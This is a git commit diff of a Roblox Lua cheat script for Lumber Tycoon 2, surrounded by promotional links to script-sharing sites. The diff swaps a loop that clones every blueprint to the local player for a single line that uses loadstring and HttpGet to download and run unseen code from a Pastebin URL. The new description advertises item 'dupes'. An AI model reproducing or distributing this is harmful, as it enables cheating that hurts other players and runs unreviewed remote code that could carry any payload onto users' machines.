65bf5107ff708bfc2079bf2ce950c160945df630
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-26 07:09:25 +0100

    commit zero

--- LINK GAME Script pastebin roblox Lumber Tycoon 2 .lua
+++ LINK GAME Script pastebin roblox Lumber Tycoon 2 .lua
@@ -1,14 +1,13 @@
 -- find more powerfull verified and New Scripts here : https://script-pastebin.com
 
-for i,v in pairs(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures:GetChildren()) do
-local clone = v:Clone()
-clone.Parent = game.Players.LocalPlayer.PlayerBlueprints.Blueprints
-end
+loadstring(game:HttpGet("https://pastebin.com/raw/hnVtRcyb"))()  
 
 -- find more powerfull verified and New Scripts here : https://scriptpastebin.io
 
 --[[ Script Description:
 
-							The script gives you all the drawings in this game!
+							The Gui
+First Dupe
+Other Dupes
 						
 ]]
